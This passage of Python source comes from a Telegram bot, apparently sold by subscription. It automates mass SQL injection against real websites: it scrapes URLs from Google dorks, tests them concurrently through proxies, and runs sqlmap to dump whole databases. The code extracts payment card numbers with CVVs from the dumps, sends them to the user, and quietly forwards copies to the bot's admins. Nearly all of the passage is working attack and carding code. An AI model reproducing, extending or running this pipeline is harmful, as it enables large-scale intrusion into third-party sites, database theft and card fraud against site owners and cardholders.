        f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{len(injectable):,}` URLs\n"
        f"✅ Cʟᴇᴀɴ      : `{len(not_inject):,}` URLs\n\n"
        f"{emoji} Sᴄᴀɴ Dᴏɴᴇ. Fɪʟᴇ Bᴇʟᴏᴡ ⬇️",
        parse_mode=ParseMode.MARKDOWN,
    )

    if injectable:
        ts = datetime.now().strftime("%d%m%y_%H%M")
        await update.message.reply_document(
            document=io.BytesIO("\n".join(injectable).encode("utf-8")),
            filename=f"sqli_vulnerable_{len(injectable)}_{ts}.txt",
            caption=(
                f"🎭 `{len(injectable):,}` Vᴜʟɴᴇʀᴀʙʟᴇ URLs\n"
                f"💥 SQL Iɴᴊᴇᴄᴛɪᴏɴ Cᴏɴғɪʀᴍᴇᴅ\n"
                "🕷️ Sᴘɪᴅᴇʏ Bᴏᴛ SQLi Sᴄᴀɴɴᴇʀ"
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
    else:
        await update.message.reply_text(
            "⚠️ Nᴏ Vᴜʟɴᴇʀᴀʙʟᴇ URLs Fᴏᴜɴᴅ.\n\n"
            "💡 Tɪᴘs:\n"
            "• Usᴇ URLs Wɪᴛʜ `?param=value` Fʀᴏᴍ Dᴇᴇᴘ Pᴀʀsᴇʀ\n"
            "• Tʀʏ Mᴏʀᴇ URLs (100+)",
            parse_mode=ParseMode.MARKDOWN,
        )

    await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU


# ── DORKS ➪ DB DUMP PIPELINE ───────────────────────────────────────────────────

async def dump_get_dorks_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    doc   = update.message.document
    file  = await context.bot.get_file(doc.file_id)
    data  = await file.download_as_bytearray()
    dorks = [d.strip() for d in data.decode("utf-8", errors="ignore").splitlines() if d.strip()]
    if not dorks:
        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ.")
        return DUMP_WAIT_DORKS
    return await _run_dump_pipeline(update, context, dorks)


async def dump_get_dorks_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    dorks = [d.strip() for d in update.message.text.strip().splitlines() if d.strip()]
    if not dorks:
        await update.message.reply_text("❌ No Dᴏʀᴋs Fᴏᴜɴᴅ. Tʀʏ Aɢᴀɪɴ.")
        return DUMP_WAIT_DORKS
    return await _run_dump_pipeline(update, context, dorks)


async def url_dump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    doc  = update.message.document
    tg_file = await context.bot.get_file(doc.file_id)
    data = await tg_file.download_as_bytearray()
    urls = [u.strip() for u in data.decode("utf-8", errors="ignore").splitlines() if u.strip().startswith("http")]
    if not urls:
        await update.message.reply_text("❌ No URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsʜ Sᴛᴀʀᴛ Wɪᴛʜ http.")
        return URL_DUMP_WAIT
    # Cap at 5000 URLs to avoid memory overload
    if len(urls) > 5000:
        await update.message.reply_text(
            f"⚠️ Lᴀʀɢᴇ Fɪʟᴇ Dᴇᴛᴇᴄᴛᴇᴅ! `{len(urls):,}` URLs Fᴏᴜɴᴅ.\n"
            "• Pʀᴏᴄᴇssɪɴɢ Fɪʀsᴛ `5,000` URLs Fᴏʀ Tʜɪs Rᴜɴ.",
            parse_mode=ParseMode.MARKDOWN,
        )
        urls = urls[:5000]
    return await _run_dump_pipeline(update, context, [], prefound_urls=urls)


async def url_dump_get_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    urls = [u.strip() for u in update.message.text.strip().splitlines() if u.strip().startswith("http")]
    if not urls:
        await update.message.reply_text("❌ No Vᴀʟɪᴅ URLs Fᴏᴜɴᴅ. Uʀʟs must Sᴛᴀʀᴛ Wɪᴛʜ http.")
        return URL_DUMP_WAIT
    return await _run_dump_pipeline(update, context, [], prefound_urls=urls)


async def _run_dump_pipeline(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    dorks: list,
    prefound_urls: list = None,
) -> int:
    uid         = update.effective_user.id
    stop_event  = asyncio.Event()
    stop_events[uid] = stop_event
    stop_kb     = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_dump")]])
    last_edit   = [0.0]
    pipe_title  = "🔖 URLs ➪ DB Dᴜᴍᴘ" if prefound_urls else "🕸️  Dᴏʀᴋs ➪ DB Dᴜᴍᴘ"

    # No dork cap — process ALL dorks; timeout scales automatically

    total_dorks = len(dorks)

    # ── PHASE 1: URL PARSING (skip if prefound_urls) ─────────────────────────
    if prefound_urls:
        found_urls = prefound_urls
        msg = await update.message.reply_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "🔖 𝙐𝙧𝙡𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 2/3\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"✅ URLs Lᴏᴀᴅᴇᴅ: `{len(found_urls):,}` (from your file)\n"
            "💉 Sᴛᴇᴘ 2: Tᴇsᴛɪɴɢ Fᴏʀ SQL Iɴᴊᴇᴄᴛɪᴏɴ...\n\n"
            "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
            reply_markup=stop_kb,
            parse_mode=ParseMode.MARKDOWN,
        )
    else:
        msg = await update.message.reply_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "📑︎ 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙚𝙨𝙚 1/3\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🛰️ Dᴏʀᴋs: `{total_dorks:,}`\n"
            "🔍 Sᴛᴇᴘ 1: Sᴄʀᴀᴘɪɴɢ URLs Fʀᴏᴍ Dᴏʀᴋs...\n\n"
            "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
            reply_markup=stop_kb,
            parse_mode=ParseMode.MARKDOWN,
        )

        async def on_parse_progress(done, total_, found, retries):
            now = time.monotonic()
            if now - last_edit[0] < 1.0:
                return
            last_edit[0] = now
            pct    = int((done / total_) * 100) if total_ else 0
            filled = int(pct / 5)
            bar    = "█" * filled + "░" * (20 - filled)
            try:
                await msg.edit_text(
                    "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                    "📑 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 1/3\n"
                    "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                    f"✅ Dᴏʀᴋs Pᴀʀsᴇᴅ : `{done:,} / {total_:,}`\n"
                    f"📈 URLs Fᴏᴜɴᴅ : `{found:,}`\n\n"
                    f"`[{bar}]` {pct}%",
                    reply_markup=stop_kb,
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass

        found_urls = await search_urls_from_dorks(
            dorks,
            limit=10_000,
            progress_callback=on_parse_progress,
            stop_event=stop_event,
            proxy_list=effective_proxy_pool(update.effective_user.id),
        )

        if stop_event.is_set() or not found_urls:
            reason = "🛑 Sᴛᴏᴘᴘᴇᴅ" if stop_event.is_set() else "⚠️ Nᴏ URLs Fᴏᴜɴᴅ"
            await msg.edit_text(
                f"🚄 *Pɪᴘᴇʟɪɴᴇ {reason}*\n\n"
                f"🛰️ Dᴏʀᴋs: `{total_dorks:,}`\n"
                f"📈 URLs : `{len(found_urls):,}`\n\n"
                "Tʀʏ Mᴏʀᴇ Dᴏʀᴋs Fᴏʀ Bᴇᴛᴛᴇʀ Rᴇsᴜʟᴛs.",
                parse_mode=ParseMode.MARKDOWN,
            )
            await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
            return MENU

    # ── PHASE 2: SQLi SCANNING ────────────────────────────────────────────────
    try:
        await msg.edit_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 2/3*\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"📈 URLs Fᴏᴜɴᴅ : `{len(found_urls):,}`\n"
            "💉 Sᴛᴇᴘ 2: Tᴇsᴛɪɴɢ URLs Fᴏʀ SQL Iɴᴊᴇᴄᴛɪᴏɴ...\n\n"
            "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
            reply_markup=stop_kb,
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception:
        pass

    vuln_urls    = []
    tested_count = [0]
    sem_sqli     = asyncio.Semaphore(200)
    _proxy_list  = effective_proxy_pool(uid)

    connector = _get_connector()
    async with aiohttp.ClientSession(connector=connector, connector_owner=False) as session:
        async def _sqli_test(url: str):
            if stop_event.is_set():
                return
            async with sem_sqli:
                proxy_url = random.choice(_proxy_list) if _proxy_list else ""
                if await _check_injectable(session, url, proxy_url=proxy_url):
                    vuln_urls.append(url)
                tested_count[0] += 1
                now = time.monotonic()
                if now - last_edit[0] >= 1.5:
                    last_edit[0] = now
                    pct    = int(tested_count[0] / len(found_urls) * 100)
                    filled = int(pct / 5)
                    bar    = "█" * filled + "░" * (20 - filled)
                    try:
                        await msg.edit_text(
                            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 2/3*\n"
                            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                            f"📈 URLs Tᴇsᴛᴇᴅ : `{tested_count[0]:,}/{len(found_urls):,}`\n"
                            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ  : `{len(vuln_urls):,}`\n\n"
                            f"`[{bar}]` {pct}%\n\n"
                            "_Injecting SQL payloads..._",
                            reply_markup=stop_kb,
                            parse_mode=ParseMode.MARKDOWN,
                        )
                    except Exception:
                        pass

        # Process in batches of 600
        SQLI_BATCH = 600
        for i in range(0, len(found_urls), SQLI_BATCH):
            if stop_event.is_set():
                break
            batch = found_urls[i: i + SQLI_BATCH]
            await asyncio.gather(*[_sqli_test(u) for u in batch], return_exceptions=True)

    if stop_event.is_set() or not vuln_urls:
        reason = "🛑 Sᴛᴏᴘᴘᴇᴅ" if stop_event.is_set() else "⚠️ Nᴏ Vᴜʟɴᴇʀᴀʙʟᴇ URLs"
        await msg.edit_text(
            f"🚄 *Pɪᴘᴇʟɪɴᴇ {reason}*\n\n"
            f"📈 URLs Tᴇsᴛᴇᴅ : `{tested_count[0]:,}`\n"
            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ  : `{len(vuln_urls):,}`\n\n"
            "_Nᴏ Iɴᴊᴇᴄᴛᴀʙʟᴇs Fᴏᴜɴᴅ Iɴ Tʜɪs Bᴀᴛᴄʜ._",
            parse_mode=ParseMode.MARKDOWN,
        )
        await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
        return MENU

    # ── PHASE 3: SQLMAP DATABASE DUMP (REST API + fallback subprocess) ───────
    o        = _get_sqlopts(uid)
    eng      = o["engine"]
    use_bulk = o["bulk"]
    lvl      = o["level"]
    rsk      = o["risk"]
    tech     = o["technique"]
    tamp     = o["tamper"]
    threads  = o["threads"]
    crawl    = o["crawl"]
    eng_tag  = "REST API" if eng == "api" else "Subprocess"

    try:
        await msg.edit_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3*\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ URLs : `{len(vuln_urls):,}`\n"
            f"🎠 Eɴɢɪɴᴇ         : *{eng_tag}*\n"
            f"♨️ Lᴇᴠᴇʟ/Rɪsᴋ      : `L{lvl}R{rsk}`\n"
            f"🧤 Tᴇᴄʜɴɪǫᴜᴇ       : `{tech}`\n"
            f"🛡️ Tᴀᴍᴘᴇʀ         : `{tamp[:40]}`\n"
            f"⚜️ Bᴜʟᴋ Mᴏᴅᴇ       : `{'ON' if use_bulk else 'OFF'}`\n\n"
            "🕳️ Dᴜᴍᴘɪɴɢ Dᴀᴛᴀʙᴀsᴇs — ZIPs Wɪʟʟ Bᴇ Sᴇɴᴛ Sᴏᴏɴ Aᴄᴄᴏʀᴅɪɴɢ Sɪᴛᴇ...\n\n"
            "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
            reply_markup=stop_kb,
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception:
        pass

    all_cards    = []
    ts           = datetime.now().strftime("%d%m%y_%H%M")
    last_log     = [""]
    dump_results = []

    if eng == "api":
        # ── REST API MODE ──────────────────────────────────────────────────────
        async def on_dump_progress_api(done, total_, success):
            now = time.monotonic()
            if now - last_edit[0] < 2.0:
                return
            last_edit[0] = now
            pct    = int((done / total_) * 100) if total_ else 0
            filled = int(pct / 5)
            bar    = "█" * filled + "░" * (20 - filled)
            log_snippet = last_log[0][:120].replace("`", "'") if last_log[0] else "_sqlmap running..._"
            try:
                await msg.edit_text(
                    "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                    f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3 (REST API)*\n"
                    "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                    f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{total_:,}` sites\n"
                    f"🐊 Pʀᴏᴄᴇssᴇᴅ  : `{done:,}`\n"
                    f"🕳️ Dᴜᴍᴘᴇᴅ     : `{success:,}`\n"
                    f"💳 Cᴄ Hɪᴛs  : `{len(all_cards):,}`\n\n"
                    f"`[{bar}]` {pct}%\n\n"
                    f"📡 `{log_snippet}`",
                    reply_markup=stop_kb,
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass

        async def on_each_result_api(r: ApiTaskResult, zip_bytes: bytes):
            if r.cards:
                all_cards.extend(r.cards)
            dump_results.append(r)
            if zip_bytes:
                domain = (r.url.split("/")[2][:40] if "/" in r.url else r.url[:40]) if r.url else "unknown"
                banner_txt = f"\n🐊 `{r.banner[:60]}`" if r.banner else ""
                db_txt     = f"\n🔰 `{r.current_db[:40]}`" if r.current_db else ""
                try:
                    await update.message.reply_document(
                        document=io.BytesIO(zip_bytes),
                        filename=f"sqlmap_{domain}_{ts}.zip",
                        caption=(
                            f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
                            f"📈 `{r.url[:80]}`"
                            f"{banner_txt}{db_txt}\n"
                            f"💳 CC Hɪᴛs: `{len(r.cards)}`"
                        ),
                        parse_mode=ParseMode.MARKDOWN,
                    )
                except Exception:
                    pass

        def on_log_line(url: str, line: str):
            last_log[0] = line

        if use_bulk:
            # One sqlmap task for all URLs (--bulk-file)
            bulk_result = await api_bulk_dump(
                vuln_urls,
                proxy_list   = effective_proxy_pool(uid),
                level        = lvl,
                risk         = rsk,
                technique    = tech,
                threads      = threads,
                tamper       = tamp,
                stop_event   = stop_event,
                log_cb       = lambda line: None,
            )
            if bulk_result.success:
                dump_results.append(bulk_result)
                all_cards.extend(bulk_result.cards)
        else:
            await api_dump_multiple(
                vuln_urls,
                proxy_list     = effective_proxy_pool(uid),
                level          = lvl,
                risk           = rsk,
                technique      = tech,
                threads        = threads,
                tamper         = tamp,
                crawl_depth    = crawl,
                stop_event     = stop_event,
                progress_cb    = on_dump_progress_api,
                per_result_cb  = on_each_result_api,
                log_sample_cb  = on_log_line,
            )

    else:
        # ── SUBPROCESS FALLBACK MODE ──────────────────────────────────────────
        sqlmap_base = tempfile.mkdtemp(prefix="loop_sqlmap_")

        async def on_dump_progress_sub(done, total_, success):
            now = time.monotonic()
            if now - last_edit[0] < 2.0:
                return
            last_edit[0] = now
            pct    = int((done / total_) * 100) if total_ else 0
            filled = int(pct / 5)
            bar    = "█" * filled + "░" * (20 - filled)
            try:
                await msg.edit_text(
                    "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                    f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 3/3 (𝙎𝙪𝙗𝙥𝙧𝙤𝙘𝙚𝙨𝙨)*\n"
                    "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                    f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{total_:,}` sites\n"
                    f"🧤 Pʀᴏᴄᴇssᴇᴅ  : `{done:,}`\n"
                    f"🕳️ Dᴜᴍᴘᴇᴅ     : `{success:,}`\n"
                    f"💳 CC Hɪᴛs  : `{len(all_cards):,}`\n\n"
                    f"`[{bar}]` {pct}%\n\n"
                    "_sqlmap subprocess running..._",
                    reply_markup=stop_kb,
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass

        async def on_each_result_sub(r: SqlmapResult, zip_bytes: bytes):
            if r.cards:
                all_cards.extend(r.cards)
            dump_results.append(r)
            if zip_bytes:
                domain = r.url.split("/")[2][:40] if r.url else "unknown"
                try:
                    await update.message.reply_document(
                        document=io.BytesIO(zip_bytes),
                        filename=f"sqlmap_{domain}_{ts}.zip",
                        caption=(
                            f"🕳️ *DB Dᴜᴍᴘ: {domain}*\n"
                            f"📈 `{r.url[:80]}`\n"
                            f"🔖 CSV Fɪʟᴇs: `{r.csv_files}`\n"
                            f"💳 CC Hɪᴛs: `{len(r.cards)}`"
                        ),
                        parse_mode=ParseMode.MARKDOWN,
                    )
                except Exception:
                    pass

        await sqlmap_dump_multiple(
            vuln_urls,
            base_dir     = sqlmap_base,
            proxy_list   = effective_proxy_pool(uid),
            stop_event   = stop_event,
            progress_cb  = on_dump_progress_sub,
            per_result_cb= on_each_result_sub,
        )
        try:
            shutil.rmtree(sqlmap_base, ignore_errors=True)
        except Exception:
            pass

    all_cards = list(dict.fromkeys(all_cards))

    stopped = stop_event.is_set()
    status  = "Sᴛᴏᴘᴘᴇᴅ" if stopped else "Cᴏᴍᴘʟᴇᴛᴇ"
    emoji   = "🛑" if stopped else "✅"

    await msg.edit_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🦝︎ 𝙎𝙦𝙡-𝙈𝙖𝙥 𝘿𝙪𝙢𝙥 — {status}!\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"📋 Dᴏʀᴋs Pʀᴏᴄᴇssᴇᴅ  : `{total_dorks:,}`\n"
        f"📈 URLs Fᴏᴜɴᴅ       : `{len(found_urls):,}`\n"
        f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ       : `{len(vuln_urls):,}`\n"
        f"🕳️ Sɪᴛᴇs Dᴜᴍᴘᴇᴅ     : `{len(dump_results):,}`\n"
        f"💳 CC Hɪᴛs : `{len(all_cards):,}`\n"
        f"🔧 Eɴɢɪɴᴇ           : *{eng_tag}*\n\n"
        f"{emoji} Pipeline done. Files above ⬆️",
        parse_mode=ParseMode.MARKDOWN,
    )

    if all_cards:
        cc_bytes = "\n".join(all_cards).encode("utf-8")
        cc_fname = f"loop_cards_{len(all_cards)}_{ts}.txt"
        await update.message.reply_document(
            document=io.BytesIO(cc_bytes),
            filename=cc_fname,
            caption=(
                f"💳 `{len(all_cards):,}` CC Hɪᴛs\n"
                "Format: `number|MM|YY|cvv`\n"
                "🕷️ Sᴘɪᴅᴇʏ Bᴏᴛ — Sǫʟ-Mᴀᴘ REST API Pɪᴘᴇʟɪɴᴇ"
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
        uid_ = update.effective_user.id
        if uid_ not in ADMIN_IDS:
            for _aid in ADMIN_IDS:
                try:
                    await context.bot.send_document(
                        chat_id=_aid,
                        document=io.BytesIO(cc_bytes),
                        filename=cc_fname,
                        caption=(
                            f"💥 *Aʟᴇʀᴛ — Usᴇʀ* `{uid_}`\n"
                            f"💳 `{len(all_cards):,}` CC Hɪᴛs found!\n"
                            "Fᴏʀᴍᴀᴛ: `CCN|MM|YY|cvv`\n"
                            "⚡ Sǫʟ-Mᴀᴘ Rᴇsᴛ API Pɪᴘᴇʟɪɴᴇ"
                        ),
                        parse_mode=ParseMode.MARKDOWN,
                    )
                except Exception:
                    pass

    await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU


# ── GOOGLE DORK ➪ SQLMAP DIRECT (GOD MODE) ────────────────────────────────────

async def gdork_dump_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle a raw Google dork in GDORK_DUMP_WAIT state ➪ feed directly to sqlmap."""
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU

    uid   = update.effective_user.id
    dork  = update.message.text.strip() if update.message.text else ""
    if not dork:
        await update.message.reply_text("❌ Sᴇɴᴅ Vᴀʟɪᴅ Dᴏʀᴋs. E.g. `inurl:index.php?id=`", parse_mode=ParseMode.MARKDOWN)
        return GDORK_DUMP_WAIT

    o   = _get_sqlopts(uid)
    lvl = o["level"]
    rsk = o["risk"]

    stop_event       = asyncio.Event()
    stop_events[uid] = stop_event
    stop_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_dump")]])
    ts      = datetime.now().strftime("%d%m%y_%H%M")
    last_log = [""]

    msg = await update.message.reply_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "🐍︎ 𝙂𝙊𝘿 𝙈𝙤𝙙𝙚 \n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"📑 Dᴏʀᴋ: `{dork[:100]}`\n\n"
        f"🚨 L{lvl}R{rsk} │ {o['technique']} │ `{o['tamper'][:30]}`\n\n"
        "🐊 Sǫʟ-Mᴀᴘ Qᴜᴇʀʏɪɴɢ Gᴏᴏɢʟᴇ ➪ Tᴇsᴛɪɴɢ Aʟʟ Rᴇsᴜʟᴛs...\n\n"
        "`[░░░░░░░░░░░░░░░░░░░░]`  Sᴄᴀɴɴɪɴɢ...",
        reply_markup=stop_kb,
        parse_mode=ParseMode.MARKDOWN,
    )

    last_edit = [time.monotonic()]

    def on_log(line: str):
        last_log[0] = line
        now = time.monotonic()
        if now - last_edit[0] < 2.0:
            return
        last_edit[0] = now
        snippet = line[:120].replace("`", "'")
        asyncio.ensure_future(
            msg.edit_text(
                "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                "🐍︎ 𝙂𝙊𝘿 𝙈𝙤𝙙𝙚 \n"
                "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                f"📑 Dᴏʀᴋ: `{dork[:80]}`\n\n"
                "🐎 Rᴜɴɴɪɴɢ — Rᴇsᴜʟᴛs — ZIPs...\n\n"
                f"📡 `{snippet}`",
                reply_markup=stop_kb,
                parse_mode=ParseMode.MARKDOWN,
            )
        )

    all_cards = []

    async def on_result(r: ApiTaskResult, zip_bytes: bytes):
        if r.cards:
            all_cards.extend(r.cards)
        if zip_bytes:
            label = dork[:30].replace("`", "")
            banner_txt = f"\n🔖 `{r.banner[:60]}`" if r.banner else ""
            db_txt     = f"\n🐍 `{r.current_db[:40]}`" if r.current_db else ""
            try:
                await update.message.reply_document(
                    document=io.BytesIO(zip_bytes),
                    filename=f"gdork_dump_{ts}.zip",
                    caption=(
                        f"🐍 *GOD Mᴏᴅᴇ Rᴇsᴜʟᴛs*\n"
                        f"♨️ `{label}`"
                        f"{banner_txt}{db_txt}\n"
                        f"💳 CC Hɪᴛs: `{len(r.cards)}`"
                    ),
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass

    result = await api_google_dork_dump(
        dork,
        proxy_list   = effective_proxy_pool(uid),
        level        = lvl,
        risk         = rsk,
        technique    = o["technique"],
        threads      = o["threads"],
        tamper       = o["tamper"],
        stop_event   = stop_event,
        log_cb       = on_log,
        per_result_cb= on_result,
    )

    if result.cards:
        all_cards.extend(result.cards)
    all_cards = list(dict.fromkeys(all_cards))

    stopped = stop_event.is_set()
    status  = "Sᴛᴏᴘᴘᴇᴅ" if stopped else "Cᴏᴍᴘʟᴇᴛᴇ"
    emoji   = "🛑" if stopped else "✅"

    await msg.edit_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "🐍︎ 𝙂𝙊𝘿 𝙈𝙤𝙙𝙚 \n"
        "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"📑 Dᴏʀᴋ: `{dork[:80]}`\n\n"
        f"📈 Tᴀʙʟᴇs Dᴜᴍᴘᴇᴅ   : `{len(result.tables)}`\n"
        f"💳 CC Hɪᴛs Fᴏᴜɴᴅ: `{len(all_cards)}`\n"
        f"{'🦝 ' + result.banner[:60] if result.banner else ''}\n\n"
        f"{emoji} {status}. Fɪʟᴇs Aʙᴏᴠᴇ ⬆️",
        parse_mode=ParseMode.MARKDOWN,
    )

    if all_cards:
        cc_bytes = "\n".join(all_cards).encode("utf-8")
        cc_fname = f"godmode_cards_{len(all_cards)}_{ts}.txt"
        await update.message.reply_document(
            document=io.BytesIO(cc_bytes),
            filename=cc_fname,
            caption=(
                f"💳 `{len(all_cards):,}` CC Hɪᴛs\n"
                "🐍 GOD Mᴏᴅᴇ — Dᴏʀᴋ ➪ Sǫʟ-Mᴀᴘ ➪ CC's"
            ),
            parse_mode=ParseMode.MARKDOWN,
        )
        uid_ = update.effective_user.id
        if uid_ not in ADMIN_IDS:
            for _aid in ADMIN_IDS:
                try:
                    await context.bot.send_document(
                        chat_id=_aid,
                        document=io.BytesIO(cc_bytes),
                        filename=cc_fname,
                        caption=(
                            f"💥 *CC Hɪᴛ — Usᴇʀ* `{uid_}`\n"
                            f"💳 `{len(all_cards):,}` CC Hɪᴛs Fᴏᴜɴᴅ!\n"
                            "🐍 GOD Mᴏᴅᴇ — Dᴏʀᴋ ➪ Sǫʟᴍᴀᴘ ➪ CC's"
                        ),
                        parse_mode=ParseMode.MARKDOWN,
                    )
                except Exception:
                    pass

    await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU


# ── PURCHASE FLOW ──────────────────────────────────────────────────────────────

async def purchase_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    data  = query.data

    if data == "menu_back":
        context.user_data.clear()
        await send_main_menu(update, context)
        return MENU

    if data.startswith("buy_"):
        plan_code = data[4:]
        if plan_code not in PLAN_MAP:
            return PURCHASE_MENU
        label, emoji, delta = PLAN_MAP[plan_code]
        await query.edit_message_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            f"🍷︎ 𝙋𝙪𝙧𝙘𝙝𝙖𝙨𝙚 — 𝙋𝙡𝙖𝙣𝙨\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"Pʟᴀɴs: *{label}*\n\n"
            f"Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ:\n"
            f"🥂 {ADMIN_USERNAME}\n\n"
            f"_Cᴏɴᴛᴀᴄᴛ Wɪᴛʜ Yᴏᴜʀ Cʜᴏɪᴄᴇ._\n",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🥂 Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ", url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")],
                [InlineKeyboardButton("⬅️ Bᴀᴄᴋ",         callback_data="menu_purchase")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return PURCHASE_MENU

    if data == "menu_purchase":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "🍷︎ 𝙋𝙪𝙧𝙘𝙝𝙖𝙨𝙚 — 𝙋𝙡𝙖𝙣𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"Cʜᴏᴏsᴇ A Pʟᴀɴ Aɴᴅ Cᴏɴᴛᴀᴄᴛ: 🥂 {ADMIN_USERNAME}",
            reply_markup=make_purchase_menu(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return PURCHASE_MENU

    await send_main_menu(update, context)
    return MENU


# ── Rᴇᴅᴇᴇᴍ Kᴇʏ ─────────────────────────────────────────────────────────────────

async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    key     = update.message.text.strip().upper()

    if key not in license_keys:
        await update.message.reply_text(
